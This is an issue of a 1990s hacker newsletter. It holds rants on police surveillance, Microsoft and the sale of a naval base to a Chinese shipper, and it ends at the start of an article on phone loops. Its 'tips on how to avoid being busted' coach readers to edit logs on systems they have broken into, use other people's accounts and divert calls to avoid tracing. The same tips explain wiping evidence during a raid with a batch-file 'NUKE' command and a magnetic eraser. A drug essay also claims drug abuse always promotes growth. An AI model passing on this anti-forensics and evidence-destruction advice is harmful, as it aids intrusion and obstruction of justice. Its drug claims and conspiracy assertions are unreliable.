INTRODUCTION:  Greetings to our loyal readers that continue to seek the honesty
               and truth that is in the Damage, INC. Newsletter.  In a world
               that is engulfed in a thick fog of lies, corruption, and
               hypocrisy, honesty is the bright torch that dispels the darkness.
               Unfortunately, the fog that surrounds us can also be within a
               person.  When a person believes the lies, ignores corruption, and
               tolerates hypocrisy, his or her mind is lost in darkness.  Only
               honesty and the truth can burn through the fog, enlightening that
               person's mind, allowing him or her to expand and grow stronger.
               However, the torch of honesty can only be grasped by a person
               that wants to obtain it.

               Each individual must choose whether they wish to be a zombie or
               an enlightened human being.  For those that choose to learn the
               honest truth and to grow outwards as a person, the Damage, INC.
               Newsletter is intended to be a torch to help you on your journey.
               How you interpret the words within, and whether you agree or
               disagree with our thoughts and opinions is up to you.  As long as
               you kindle new found knowledge that was presented to you with
               honest intentions and allow it to burn within you, the truth will
               be within your grasp.  If you accept the truth, you can begin to
               dispel the fog that may have been planted in your mind.  It
               depends on how hard you will work and fight to learn the truth.


BIG BROTHER BASHING -                                         {BIG BROTHER}
Old civil rights killed by new technologies.

Canadian Charter of Rights and Freedoms; Section 8:
    "Everyone has the right to be secure against unreasonable search or
     seizure."

Fourth Amendment to the Constitution of the United States of America:
    "The right of the people to be secure in their persons, houses, papers, and
     effects, against unreasonable searches and seizures, shall not be violated,
     and no Warrants shall issue, but upon probable cause, supported by Oath or
     affirmation, and particularly describing the place to be searched, and the
     persons or things to be seized."

Protection against unreasonable search and seizure.  Well-meaning passages
written with the best of intentions.  They are designed to prevent citizens, and
their possessions, from being frisked without reason by powertripping police
officers.  To a much lesser extent, they prevent the government and its
bureaucracies from invading a citizen's privacy.  However, these "protective
clauses" were written for tactics used in a different era.  In days when there
was no recourse for the police, but to physically frisk someone or search a
building.  New technologies have changed all that.  It is now within the Thought
Police's power to literally see you naked, with the exception of any other
foreign objects you may have near your body... without you even knowing about
it.

In 1996, Millimetrix Corp. developed what they call a "Passive Millimetre
Wave Imager" (PMWI).  It allows a cop to "read" the electromagnetic waves that
all human beings broadcast.  The electromagnetic waves goes right through
clothing, but objects like concealed weapons, certain packages, etc., block the
waves.  Two versions of the PMWI were developed by Millimetrix.  A larger
version is designed to be placed inside of a police cruiser.  By looking at a
little monitor installed in his dashboard, the cop can scan a large group of
people before he gets out of his car to confront them.  A battery powered,
hand-held unit was also developed so a cop can virtually strip the clothes off
of one person, or a large group of people while on foot.

Whom do you believe gave Millimetrix Corp. the funds to develop this
privacy-intrusive technology?  Big Brother of course.  The United States'
National Institute of Justice them granted $2.1 million US in order to "protect
the United States from terrorist attack."  In my opinion, that kind of rhetoric
is Big Brother using the "protecting society from crime/terrorism" line again.

However, unwarranted searching technologies like PMWIs aren't exclusively in the
hands of anti-terrorist agencies.  They have given them to ordinary, uniformed
officers and installed them in police cruisers.  The "boys and girls in blue"
are assigned to monitor and bust *us*, not to stop terrorist groups from
destroying the "valuable" properties owned by Big Brother and big business.

A tremendous bonus for the police is the fact that the PMWI can operate up to 27
metres away from the victim of his unwarranted search.  The PMWI can also see
through walls to further invade the privacy of all citizens that are under the
surveillance of Big Brother.  Millimetrix Corp. is quick to point out that the
PMWI offers "some privacy."  After all, it "does not reveal intimate anatomical
details of the person."  It allows a cop to perform a body search without the
knowledge of the citizen, yet it stops a perverted one from being a virtual
`peeping Tom.'  Now Big Brother and his cohorts are telling us in essence that
there are "varying degrees of privacy."  Huh?  How it is possible to have
varying degrees in privacy?  Something is either private, or it is not.  Of
course you are entitled to your own opinion.

Big Brother's message to the zombies in "society" therefore equates to "do as I
say, and you will *not* do as I do."  Do you think that the majority of people
in "society" have bought into this blatant hypocrisy?  Oh hell yes!  :-(  While
doing research for this article, I found the results of a survey from the Los
Angeles Times.  The respondents were asked if they would "curtail some `civil
liberties' if it would help thwart terrorism."  Fifty-eight percent said yes,
they would willingly surrender their civil rights to Big Brother.  An additional
13 percent said "it would depend on what rights were at stake."  Whether the
survey was doctored by the Los Angeles Times on behalf of Big Brother, or is
legitimate, the result will influence many people to go with the grain and agree
with the majority.

Let's burn through the rhetoric and lies that Big Brother spreads in an attempt
to brainwash all citizens.  In truth, the Constitution, the Bill of Rights and
the watered down Canadian equivalent, the Charter of Rights and Freedoms, and
the court's fleeting adherence to them is Big Brother's largest road block.  Big
Brother wants to limit our actions and thoughts in order to control us.  By
buying into the overblown fears of terrorism, Big Brother's supporters within
"society" have allowed Big Brother to slice away at our constitutional rights
until they are virtually meaningless.  I feel the "majority of people" should
not be so paranoid about terrorist attack.  Big Brother is more of a threat to
their quality of life than any terrorist could possibly be.  Unless the wish of
the "majority" is to live in the oppressive totalitarian state that Big Brother
is creating.  :-(

BLACKENED'S TIP OF THE MONTH -                                  {BLACKENED}
Tips on how to avoid being busted:

These are only basic tips on how to avoid being busted.  Some of them are
based upon my personal experience, some of them are used by others, and the
remainder are just ideas.  You must use your own common sense and judgement.
I am by no means promoting, advocating or condoning hacking/phreaking.  In
fact, the following tips can be applied to other activities that are totally
legal if you just want to protect your privacy.  They're for informational
purposes only.  If you want to hack or phreak and apply them to that, then
it's your choice and you are free to do so.  However, Damage, INC. isn't
responsible if you use these techniques, do something illegal and get busted.

I would advise that you always be cautious, h/p safely and take any measures
necessary to ensure that you aren't being traced though... if you are going
to get involved in hacking and phreaking.  Always remember that "ignorance of
the law" and "being a newbie" aren't acceptable excuses to law enforcement.
They will bust you, regardless of what excuses you make, your level of
experience or the amount of years that you've been involved in h/p.  In fact,
many of the people that are getting busted are newbies.  Most of the others
think that they're invulnerable, due to their ego and pure arrogance.  Don't
allow that to happen to you.  Don't get sloppy, make stupid mistakes, and be
easily traceable.  Read every article that you can relating to being busted
and how to avoid it.  You can learn and benefit tremendously from reading
about someone else's bust experience, and thus avoid foolishly repeating the
exact same mistakes as they once did.  If you are arrogant and think that you
don't need to know about protection against being busted, then you're on your
own and can say "I wish I knew then what I know now." or "I wish I hadn't done
that." from behind bars.  Either way, you'll only have yourself to blame.


Section 1:  Trust.

Trust is such a small word, is often overlooked and yet in reality it's the
basis of everything.  Trust is also the most important thing of all.  If
possible, trust no one.  Meaning, don't tell people about your h/p activities
and trust them with that information.  Don't brag to other hackers/phreaks
(or anyone else for that matter) either.  In fact, you shouldn't even tell your
personal friends certain things (especially not over the phone).  ;)  If you
do that, then you risk getting busted.  It's not necessary, so why put yourself
at risk?  Plus, they could rat you out if they happen to get busted... in
exchange for a lighter sentence (making a deal, plea bargaining).  If you can't
abide by that rule/tip, then be *very* careful about who you trust and what
information you trust them with.  I realize that it's difficult not to trust
anyone, but it's the safest method with certain sensitive (illegal) information.
There are certain documents etc. that you shouldn't distribute to others under
any circumstances.

If you have known someone for the majority of your life, then you should at
least consider limiting your trust of them.  Trust should never be given out
quickly and easily.  Don't just trust them with everything.  Otherwise, it
could come back to haunt you.  You cannot predict whether or not someone that
you 'trust' will betray you in the future.  Obviously, each person's situation
is different.  Always try to use good judgement.  Think of the possibilities,
consequences etc. before you entrust someone with specific information that
could lead to you being busted.  Don't give out access freely to anything that
could be used against you as evidence.  That includes your system, files, codes,
detailed stories describing what you've done and anything else that you think
*might* turn out to be harmful to you.  Basically, be careful with what you type and
and say in voice conversations.  Sometimes your friends can be enemies willing
to testify against you.  Never forget that.


Section 2:  Encryption.

Is encryption safe?  Is it reliable and fool proof?  Can they bust me, decrypt
all of my data and use it in court as evidence against me?  If encryption won't
protect me then should I bother to encrypt files?  In this section, I'll attempt
to answer these important questions.  However, if you want more information then
I suggest that you read and learn more about cryptography.

Some methods of encryption aren't "safe" to use, thus they should be avoided.
*Any* encryption that conforms to standards set by the government is unsafe.
If you suspect that you're using an encryption program that abides by the
government standards, quit using it immediately.  Then find out which ones don't
and switch to that one.  Make absolutely sure that you know it doesn't conform
before you start relying on it.  In other words, do some research first.

However, regardless of what type of encryption you use, your data still isn't
completely safe and secure anyway.  Why not?  The reason is that it relies on a
password.  That is the weakest link in encryption, and that's what will be
first attacked by law enforcement and then exploited.  So, even if you've
encrypted your entire hard drive, backups etc. they can still use brute force
to decrypt it and access everything.  Meaning, they'll simply use password
cracking utilities to do the job for them.  Also, keep in mind that they'll
confiscate your computer system and anything computer related near it... which
gives them an unlimited amount of time to work on it.  That's what search and
seizure means.  Just because you don't keep information (codes etc.) in
plaintext files or written down on paper etc. doesn't mean that you're safe.
Just as, if you think a long password (as an example, one more than the typical
8 characters password that many people use) is going to protect you, then
you're wrong.  It won't stop them.  No encryption offers total protection and
security... not even 128 bit.  Even so, you should encrypt lists of codes and
anything else that you feel could be used against you.  It won't keep all prying
eyes from reading and/or accessing it but at least it offers minimal security.
You can also use encryption in combination with programs/devices that will
destroy the encrypted data in a bust situation.  More information on that will
be mentioned in the following sections.


Section 3:  Precautions and Prevention.

Obviously, you want to prevent yourself from ever getting busted.  If you hack
or phreak, you don't want to be detected and traced.  How does one avoid
detection?  What precautions should be taken?  What methods are "safe"?  What
does stealth mean?  Are these measures really necessary to protect myself and
my privacy?  In this section, I'll answer those important questions and also
give you some other sources of reliable information to consult.

First, the importance of prevention cannot be overstated.  If you actively work
and think of ways to prevent yourself from being detected, then your chances of
actually being busted will be decreased significantly.  Your motivation to do
this should be the fact that if you're actively involved in h/p and you take
no steps to avoid detection, then eventually you'll end up serving time due to
your own arrogance and ignorance.  Don't let your ego cloud your judgement.
Never assume that it'll never happen to you.  Logic dictates that anyone that
hacks/phreaks can be busted, regardless of what level you're at, how much you
think you know, how popular and well known you are in the h/p scene.  So, we
encourage you to take these steps to avoid being detected and busted.  That's
not an easy task though, so don't become overly confident.  Constantly being
stealthful requires a lot of effort and thought if you're going to be successful
at remaining undetected and anonymous while hacking/phreaking.  Here are a few
tips to consider following:


-/- Don't have phone lines etc. installed in your real name.  Make sure your
    number is unlisted as well.

-/- Don't give your real name, address, phone number etc. for any accounts on
    networks.  That includes ISPs, if you pay for accounts.  I'd advise that you
    borrow other people's instead though.

-/- Don't dial anything directly that you're hacking.  Always divert and dial
    through multiple things like networks etc. to prevent being easily traced.

-/- Always examine and edit all logs on the systems that you hack.  Make sure
    that copies of the logs aren't sent elswhere on the system.  Look for
    email daemons on admin accounts etc.  Not all systems are the same and
    use default paths, so be careful.

-/- Avoid attending all of the hacker conventions (like Defcon etc.), and be
    aware of the fact that they're monitored.  Don't become too "well known".
    Popularity is good for your ego, but obviously makes it easy to identify
    you.

-/- Don't get caught up in socializing with other hackers/phreaks and give them
    personal information about yourself.  Never assume that they're not being
    investigated or won't rat you out.  Many hackers are caught because someone
    else they know got busted and cooperated with the law enforcement
    authorities.  So, be careful not to give out your phone number, real name,
    address, information about what you're hacking etc. to people.  Hackers
    often setup or turn in other hackers.  Many have worked with law enforcement
    after they've been busted...and help catch whoever they're told to.  So,
    be stealthful whenever possible.

-/- Don't transit personal data to other systems.  That includes ones that
    you've hacked.  Never store documents or "trophies" taken from other systems
    that you've hacked on an insecure system.  They can trace it back to you if
    you do that.  They can find out where you've called, check those systems,
    find the files and that's proof enough of where you got them from.

-/- Use different handles/aliases/login IDs on systems when you setup accounts.
    That way, it won't be so obvious and easy for them to link together.

-/- Keep your hacking activities seperate from everything else.  If you use
    computers at a University, or a network, for normal use, don't use the same
    systems for hacking purposes.  Check around for and be aware of cameras
    whenever you're using a system in a lab.  Also, if you do go to remote
    locations to hack/phreak, don't follow any regular schedule.  Be observant
    and watch for anything or anyone that seems out of place.  If something
    isn't right, leave.  Sometimes law enforcement will figure out that you
    use systems or phones at certain places, and wait there for you to arrive.

-/- Don't become predictable.  Falling into the trap of doing the same things
    from the same places and getting too "comfortable" with your surroundings
    can end up being your downfall.  Never assume that you're safe.  If at all
    possible, move to different areas.  If you live in the same place for too
    long, then it's simple for them to track you down.  Plus, with the same
    phone number, they can log all of your outgoing calls etc. easily.

-/- Be careful with which PBXs, extenders, loops, other codes you use.  Learn
    about ANI.  Also, if you're using an extender or loop to divert, be sure
    to check it several times by dialing an ANI to be certain that it can be
    used as a working diverter.  Dialing through multiple extenders that divert
    may not be enough.  In fact, it may even harm you.

-/- Be careful when using any outdials etc. and know what you're doing.

-/- Don't get into carding, malicious hacking etc.  It'll only lead to you
    getting busted.  If you're already involved in that, quit now.

-/- Never destroy or edit any data on systems you've hacked into unnecessarily.
    That means, only edit logs etc. to cover your tracks and leave the rest
    as is.

-/- Don't use IRC to chat with your friends in channels like #519, #warez etc.
    If you associate with lamers like that, then you'll eventually get caught.
    Avoid using the same alias while on the net.  Again, be stealthful (or
    completely anonymous) if at all possible.  If you can access the net
    anonymously, spoof your IP, etc. that still may not be enough if they
    they really want to get you.  Plus, IRC is logged and monitored.

-/- Data/Voice numbers that you dial using your modem/phone can be used to
    track you down... regardless if you move.  If you dial the same numbers
    (a friend, a certain system, a certain BBS, whatever) frequently, that
    data is recorded.  Therefore, even if you've moved several times to
    different cities/states/provinces, the telco can still trace you because
    of that.  They can just cross reference it with all of the incoming calls
    to that particular number.  They can also question the person that owns
    that line.

-/- Learn how to check your line for taps.  Take any measures that you can to
    make sure that it's secure physically.  By that, I mean look at it and
    see if it's been tampered with etc. and learn more about meausures that
    you can take to protect it.

-/- Be observant.  If you think that you're under surveilance, then take the
    steps discussed below about destroying data.

There are quite a few other things that you can do to avoid being detected and
busted.  Agent Steal had a few interesting ideas in his Phrack article that are
hardware based.  One was what he referred to as a Stealth Box.  It actually
isn't that complex and doesn't require a lot of electronics knowledge.  You
need two modems etc though.  ;)  There are many other things that could've been
included in this article, but it's already quite lengthy.


Section 4:  Destruction of evidence.

I'm not advocating or encouraging obstruction of justice.  However, if you are
about to be busted and feel the need to destroy any so-called "evidence" that
may exist on your system, here are a few ideas.

First, hopefully your sensitive data is already encrypted.  It's not a good idea
to store codes, documents etc. in plaintext format.  Second, you'll need to
have a copy of the NUKE utility by Damage, INC. in your path.  Third, you should
create a BUST.BAT file that includes commands such as "NUKE C:\STUFF\*.*" for
the areas that the files you want to nuke are stored in.  The batch file just
makes the entire procedure much quicker, which can be crucial in critical bust
situations.  If said files are encrypted (with non-standardized, non-conforming
encryption), then nuked by NUKE... most likely the feds won't be able to use any
of it against you.  However, they can charge you for obstruction of justice but
that's minor in comparison.  Of course, it all depends on what they *could've*
burned you with.  So, it's a tradeoff in a sense.  Another good idea is to have
a bulk magnetic eraser mounted next to your hard drive.  Put a switch close to
your computer, so that it's easily accessible.  Or, even better than that,
install several switches for it in different locations and you can activate the
device from more than one room.  Agent Steal's article in Phrack mentions doing
the same thing, among others.  I've personally seen/used bulk erasers before
and know how quickly they'll erase data when the hard drive is powered up and
spinning.  ;)  The last resort is to use a steel hammer to physically smash the
hard drives.  Even if you're desperate and time is running out (ie, the feds are
breaking down your front door), you should still have the necessary seconds to
execute those saving actions.  I recommend that you have everything setup and
ready to use in case of a bust.  Afterall, if you're not prepared then it's too
late to do anything when you're taken by surprise.  That's why people get busted
and their systems are confiscated with everything still intact.  Basically, you
have two options at that point:  Let them take your system, get a lawyer, and
try to fight them in court... Or, do everything in your power to destroy the
evidence, obstruct the investigation any way that you can and face the lesser
charge of obstruction of justice.

In closing, I recommend that you read Agent Steal's article in Phrack issue #52
on getting busted.  Minor Threat also contributed to it.  Their first hand
accounts and experiences with the court/prison system are a must read.  It's
accurate and contains some excellent information.  Obviously, Damage, INC. hopes
that you've learned something from reading this article and wishes that you none
of you get busted.  However, some of you will.  If you are busted, don't rat out
your friends.  Only scum...the lowest of the low would do that to save their own
ass.  My final words of advice to you are:  be wise, be stealthful and extremely
cautious.  ;)

CONSPIRACIES AND COVERUPS -                                      {COVERUPS}
Red Long Beach:  China controls naval base.

As many people know Communist China is a place where free thoughts land Chinese
men and women in prison (slave) camps, and expressing them earns the person a
bullet (paid for by the surviving family) in the back of the head.  China
is the enemy of the United States of America and its allies.  In fact, they
are conspiring with Russia to create their own world order.  However, that is
the subject of another article.

Despite the fact that the Chinese communists hate our way of life, and openly
instigate conflicts, like the "war games" scenario off the shores of Taiwan,
"democratic" countries continue to cut economic trade deals with them.  It is
sickening how hypocritical the United States and Canada are when both bring up
human rights whenever they sign the latest multi-million or billion dollar deal
with Red China.  By supporting them economically, countries that trade with
China are also supporting the oppression the communists impose on the Chinese
people.  There have been some extremely disturbing "side deals" that have come
to light.  One deal centers around a closed U.S. Naval Base in Long Beach,
California.  With the support of president Bill Clinton, the Long Beach Naval
Base has been refitted and leased to the China Ocean Shipping Company (COSCO).

This conspiracy started in 1991 when George Bush decided that the Long Beach
Naval Station should be shut down in order to save money.  In 1993, Bill Clinton
finished what Bush started by making sure that the naval base was permanently
closed.  That decision lead to a loss of over 17,500 military and civilian jobs,
and crippled Long Beach's economy.  There was little interest in the abandoned
base until the end of 1995.  The Chinese got involved during a period of time
when the Clinton-Gore campaign was heavily involved in fund raising.  Clinton
and his administration secretly attempted to setup a sweet lease deal that would
"entice" COSCO to take up residence in the old Long Beach Naval Station.  The
Secretary of the Navy turned over control of the closed naval base to the City
of Long Beach, which had an estimated value of $65 million, free of charge.
Taxpayers in Long Beach paid approximately $200 million to convert the naval
base into a cargo port.  The city then turned around and leased the naval base
to a foreign shipping company that is owned and operated by Communist China.
The communists have signed a 10 year lease at the cost of $14.5 million per
year.  The lease also gives the communists the option of forcing the City of
Long Beach, at their expense, to develop an additional 150 acres of the old
shipyards.

I believe that China told Clinton what they wanted, in this case the Long Beach
Naval Station, and Clinton accommodated them without any delay or red tape.  I
have some facts that prove that the Clinton administration has links to the
Chinese.  Many powerful Democrats tried to coverup the fact that they took
campaign donations from prominent Chinese that operate within the United States.
When the Chinese contributions were revealed, the Democrats desperately attempt
to seek forgiveness from the American people.  House minority leader Richard
Gephardt, Senate minority leader Tom Daschle, and others claim to have refunded
these communist payoffs.  Also, if Clinton and his administration were not under
the influence of the Chinese, then why would they choose not to investigate
COSCO with the National Security Council, the Navy, or the CIA?  That is exactly
what happened.  To quote a White House spokesman named Lanny Davis "there seemed
to be no reason to check with the National Security Council on the decision."
Clinton didn't want his sweet Chinese deal compromised by the NSC or the CIA.
Meanwhile, COSCO was caught smuggling Russian AK-47s into Oakland, California.
A COSCO liner rammed into a busy New Orleans boardwalk.  Luckily there were no
fatalities, but 116 people were injured.  COSCO also admitted to dumping 640
tons of raw waste into the ocean instead of taking it to China.  In 1993, the
U.S. Navy spied on a COSCO ship that they believed to contained chemical weapons
components when it entered the Persian Gulf.  In 1992, COSCO was fined $400,000
for attempting to bribe U.S. officials in order to avoid paying tariffs on the
goods that they wanted to import into the United States.  Also, the United
States Coast Guard has placed COSCO on its list of "ships to monitor and search"
because of various infractions against many international safety regulations.

It is revolting how Clinton has endangered the security of the United States of
America.  Even though the NSC and CIA are untrustworthy, and are guilty of their
own conspiracies and coverups, the fact that Clinton avoided consulting them can
only mean that the communists have offered or given Clinton something that he
desperately wants.  Clinton must have some kind of self-serving reason why he
would sell the United States, piece by piece, out to its enemies like Red China.
Another disturbing fact is that a simple mayor and his local civil employees
were allowed to negotiate this lease without any thought to the security of the
United States.  Setting aside the corrupt business practices of the China Ocean
Shipping Company, the fact that they are operated by communists should have
immediately disqualified them from operating a cargo port in Long Beach.  There
is no doubt in my mind that the Chinese will use the Long Beach Naval Station as
a central base for their own intelligence agents.

That is the reason why two Republican congressmen actually attempted to stop the
Chinese from taking over the Long Beach Naval Station.  The congressmen were
concerned that COSCO would be able to smuggle goods into the United States much
easier, as well as a base for Chinese intelligence.  However, after a long
battle, it was determined that the lease would be killed if Clinton did not use
his "waiver authority" to save it.  Hmmm... in the end the communist-supporting
president, who tried to coverup the fact that he pushed for the lease of Long
Beach Naval Station to the Communist China shipper had the final decision on the
matter.

Unfortunately, I believe that the Red Long Beach conspiracy is only a small one
within a much larger conspiracy.  Bill Clinton's actions show him to be a
tremendous backer of Communist China, even at the expense of the security and
economy of the United States.  Why would Clinton push the loss of hundreds of
millions of dollars so it is easier for the Chinese to spy upon the U.S.,
as well as smuggling illegal goods, or even weapons of mass destruction?  That
is a question that all Americans should be asking of their president and his
administration.  Unfortunately, in order for the truth to be revealed, Americans
will have to stop being sidetracked by trivial "issues."

CORRUPTION AND GREED -                                              {GREED}
Billy Gates and his Overwhelming Need for Greed.

Micro$oft is a huge, corrupt, greedy corporation.  They've demonstrated
repeatedly that they have no regard for other software companies and their
goal is to buy out the competition.  Obviously, they aren't satisfied with
their current stranglehold on the industry.  They want nothing less than a
total monopoly.

This article isn't about statistics.  I'm not going to quote figures of their
quarterly or yearly profits, sales etc.  If you want to know that information,
then I'm sure you can find it by checking out a few web sites on your own.
Basically, I want to expose Gates and his company Micro$oft, to show just how
greedy and corrupt they really are.

Gates' estimated net worth is over $40 Billion U.S. dollars, and Micro$oft is
estimated to be worth $400+ billion dollars.  Both amounts are increasing so
rapidly that it's not possible to include statistics that are more accurate
than that.  In fact, it's been reported that Billy Gates has made over $100
million dollars in a single day on occasion.  I wonder if he considers that
to be a good day, or a bad day?  At any rate, that should be an indication of
his wealth.  To put it bluntly, he's stinking fucking rich.  He's not just your
average, run of the mill, fat cat.  Gates is literally the fattest cat of them
all... and he's only getting fatter as each day passes.

How much money is enough for one man?  How much power and control over an
entire industry is enough?  Why do people support, defend and have sympathy
for Mr. Billy Gates?  To be honest, I'm not sure why anyone would defend
Micro$oft and Gates.  I also don't know why people are so sympathetic towards
a wealthy geek that fears close contact with the public.  I simply don't
understand their reasons or "logic" for doing so.  In order to put things into
perspective, I'll give you a comparison to ponder.  Billy Gates has more
personal wealth than the 50 richest Canadians combined.  He has more money
than the countless thousands of citizens in Canada that are living at or below
the poverty line combined.  If he were hypothetically inclined to help them,
he could virtually eliminate poverty within this entire country (with a current
population of over 25 million people).  Indeed, tiny million dollar donations to
"charity" on his part are a mere token... a pittance... in comparison to the
vast amount that he's accumulated.  Those that defend Gates and Micro$oft remind
me of the 17th century English paupers that had nothing and yet they continued
to support their king.  Micro$oft supporters and defenders are like zombies.
They've been so utterly brainwashed that they know not what they do.  In
essence, they are not responsible for their words or actions.  They're so
ignorant and naive that they actually believe Gates deserves all that he has,
and more.  Again, how much money is enough?  Would $100 billion be enough?
$200 billion?  Perhaps $500 billion is just scratching the surface of what is
considered to be enough.  To some people, no sum of money is enough to satisfy
them and their need for greed.

Billy Gates donated some money to Harvard (which is obviously a huge tax
writeoff), but is that really a legitimate charitable donation?  Not in my eyes
it isn't.  Harvard is an ivy league school for rich kids in my opinion.  Also,
Gates has been quoted as saying that he plans to donate more money to charity
once he "retires" from the business world.  That's a pleasant and comforting
thought.  ;)  When does Billy plan to resign as the CEO of Micro$oft?  At what
point will he have amassed enough cash for his retirement?  What will his
retirement home look like?  Which tropical islands will he purchase for summer
homes?  Just try to imagine it.  It's definitely a sickening thought.

As for Micro$oft, I'll leave their corrupt practices for another article.  I'd
just like to comment on the greed of that company (some people almost see it
as an entity).  Why is Micro$oft so respected?  Why do they generate so much
support?  Why are they defended by Win95 d00ds?  Why does the media give them
any positive press?  I feel that Micro$oft is respected and supported by the
zombies that cannot use software that doesn't have point and click mouse
support.  Basically, they need icons, pulldown menus, drag and drop etc. which
is exactly what Windoze gives them.  They can't use a commandline and need to
use a GUI driven "operating system" that has the options right on their screen.
They also rely on Windoze to control their system.  Otherwise, they wouldn't
be able to use a computer at all.  Their keyboards just sit there and collect
dust.  The Windoze zombies respect Micro$oft for making their systems so zombie
friendly...err user friendly.  They absolutely love hardware such as Winmodems
that's made just for Windoze... It's hardware that's been made exclusively for
them...Windoze d00ds.  The zombies also support Micro$oft because they say that
it's "popular" and "Windoze is the industry standard" and "the quantity of
software that's available for Win95" etc.  Many of them also program in Visual
Basic since it's by Micro$oft and extremely easy to learn.  As for the mass
media, they've always supported big business.  The bigger a company is, the
better.  The larger they are, the more coverage they get.  It's just free
advertising for Micro$oft since their loyal zombie followers won't abandon them
no matter what.  Under no circumstances will the Windoze zombies even try out
software by another company.  It's a sacred rule of the zombie clan.  They're
strictly forbidden within their ranks from switching software.  I can still
vividly remember the masses of zombies rushing into stores to buy Win95 (as many
copies as they could physically carry) as soon as it was released.  That image
is burned into my mind and will never be forgotten.  They literally fought each
other and greedily grabbed as many shrink wrapped Windoze 95 boxes as they
possibly could.  I'm sure there will be another 'battle of the Windoze zombies'
once Windoze 98 is finally released.  On a side note, it was hilarious to see
Win98 crash and burn at the Chicago computer convention as Gates and countless
others watched.  That moment was one of the greatest in the history of
television in my opinion.  Billy Gates didn't look surprised in the least, but
merely embarrassed and perhaps slightly humbled by the experience.  However, his
massive ego is no doubt still intact.  He should be ashamed of his inferior
product and his business corrupt business practices.

In conclusion, I'm sure there will be other articles written on Micro$oft in
future issues of the Damage, INC. Newsletter.  My only intention for this
article was to make people think seriously about greed.  Therefore, I chose
the best and most appropriate example of greed that exists today.  Hopefully
it has informed and enlightened you somewhat.

DRUGS DISCUSSION -                                                  {DRUGS}
The Existence of Drugs in Our Culture.

    Being brought up in today's society, you could easily come to the
conclusion that there is an illegal drug problem within our nation.  Lower
class people who use drugs and alcohol to escape their pains; kids who do
anything to get high...  Unfortunately what you don't find out about is the
number of people addicted to prescription drugs.  Or the number of times an
alcoholic father beats his kids.  Or perhaps the stock broker who drinks 12
cups of coffee a day just to get by.  Yes.. I would have to say there is a
problem in our society.  But it's not an illegal drug problem.  I don't know
any crack addicts, nor do I know any heroin junkies.  But the number of
alcoholics I know is staggering; as is the number of addicted cigarette
smokers.  Yes, there definitely is a problem.
    The problem occurs because we try to hide from natural processes.  We
try to control our desires.  We are made to feel guilty for wanting to get
high, or drunk.  Yet these are animal traits.  There are certain flocks
of birds that know eating fermented berries will cause pleasure, and a
drunkenness.  Every year they will return to the same tree, because inside
they know that getting inebriated relieves stress.  It relaxes the body and
mind.  It is beneficial to them, so that is why they do it.  Interestingly,
some birds don't know when to stop... and will keep eating these alcoholic
berries until they die from poisoning.  There are many other species who also
seek out ways to get drunk.  Man cannot run away from his inner desires.  He
cannot suppress the drive; nor can he label certain items as "narcotics" and
do everything in his power to obliterate them.  Only when we realize *why* we
do drugs, will we be on our way to understanding their existence in our world.
    Why do we do drugs?  That is a very valid question.  Essentially, it is
the desire to alter one's state-of-consciousness.  Drugs induce these states
of consciousness by manipulating, or mimicking neurotransmitter chemicals in
your brain.  The chemicals in your brain determine your state of consciousness.
This is a very important statement, and I want you to re-read it.  Basically,
whenever you put something in your body, you alter your state of consciousness.
So altering your state of consciousness is not a new concept to your personality
at all - eating sugar affects your state of mind.  What differs between states
is the distance you shift from your original state of consciousness to the new
one.  Drugs accelerate your mind to a higher plane.  Rather quickly too, that
is why some people don't enjoy it.  Taking drugs is just a means to manipulating
and directing the focus of your attention.  People do drugs for the same reason
anybody does anything else - because they find it interesting.
    Upon reading this paragraph, I realize I am guilty of something.  I have
been using the word "drugs" too vaguely to convey my thoughts.  I am generally
talking about the benign drugs such as alcohol, marijuana, opium, and tobacco.
Psychedelic/hallucinogenic drugs are a much more complicated subject.  And
uppers such as cocaine and speed are based more on the nature of addiction.
To get the most out of this article, re-read the last paragraph now knowing
specifically which drugs I am talking about.
    Now we have established that people get high because they find it
interesting.  Well, I hate to sound like a 3 year old, but shouldn't we be
asking "why is it interesting?"  Or more specifically, what is interesting
about altering one's state of consciousness?  Well, recall the March 1998
issue of the Damage, INC. Newsletter.  Myself, and group members talked about
some very interesting aspects of consciousness, such as astral projection, and
the power of your mind.  If you're not familiar with those subjects, perhaps
you should read, or re-read last month's Newsletter.  To continue, drugs are a
physically oriented method of going into trance.  People who abuse drugs such
as marijuana, alcohol, LSD, psilocybin (magic mushrooms) are a lot of the time
people who are aware of themselves, and the divine potential within them; but
unfortunately their inner battle is with laziness.  So instead of diligently
meditating for six months, they take a hit of acid, or smoke a fat joint,
experiencing a distorted, yet pleasurable version of the same thing.
    This explains why drugs have, and always will exist in our culture. Their
use, and even abuse always promotes growth and learning within an individual.
Drugs expand awareness.  Drugs help solve problems.  Drugs can also help cause
problems if one is not careful ;).  Drugs soothe pain (emotional and physical).
Drugs can be spiritual.  Drugs are also symbol.  They are a symbol of man's
struggle with self-awareness, and thirst for understanding.  Some cultures,
such as the Mayans, believed that the Magic Mushroom was a gift from the gods.
A gift of awareness to bring peace and enlightenment.
    The story is a lot different today unfortunately.  These once sacred
mushrooms are now considered harmful.  By suppressing drugs, we are
suppressing the utter delight of looking at ourselves in the mirror of
awareness.  The effects have been detrimental; perhaps even devastating.  The
war on drugs is hurting our society every minute it is being enforced;  drugs
are entwined in our lives, whether you are aware of it or not.  These drugs
that have been categorized as "controlled substances" cannot be eradicated,
nor banned from use.  How ironic it is, to note that the drugs are not really
being controlled at all.  In fact, the opposite is occurring.  In the drug
war, it is not the law enforcement who are winning.  The only thing they are
doing is ruining our nation.  They kill lots of people in the process of
controlling drugs.  They also waste a lot of well needed tax dollars.  Groups
who inform their audience using propaganda and lies should *not* be groups
worthy of your trust.
    Another sad fact, is that the drug war is a result of ignorance, and
corruption.  Cannabis was originally made illegal because its potential as
a fabric was hurting the cotton and timber industries.  The big-wigs who
owned these operations coerced the government into criminalizing marijuana
because it was a form of hemp.  Hemp that can be used to make clothes, paper,
and to basically replace the disgusting logging companies.  Greed reared its
ugly head, and attempted to wipe out this profit killing plant.  They succeeded
for many decades, but finally Ontario has decided to stop the destruction of
our planet, and allow industrial hemp to be grown by farmers.  This is a step
in the right direction, but marijuana still remains a controlled substance.
And while the ignorant enforcement of these archaic laws remains in our society,
people will travel further and further away from themselves, and what they know
to be true.
    I genuinely hope people realize this soon.  Drugs are an inherent part of
our nature.  They exist as tools to help us understand ourselves and the
universe.

H/P INFORMATION AND NEWS -                                            {H/P}
Looping the Loop in your area code.

This short article on loops is the first that I've submitted to the Damage, INC.
Newsletter.  I hope that you enjoy reading it and find it informative.  Since
loops can be different in each area code, I'm only going to include general
information.  That way it'll apply to the area code that you're in.  Basically,
I'm going to explain the following:

[1]  What a loop is.
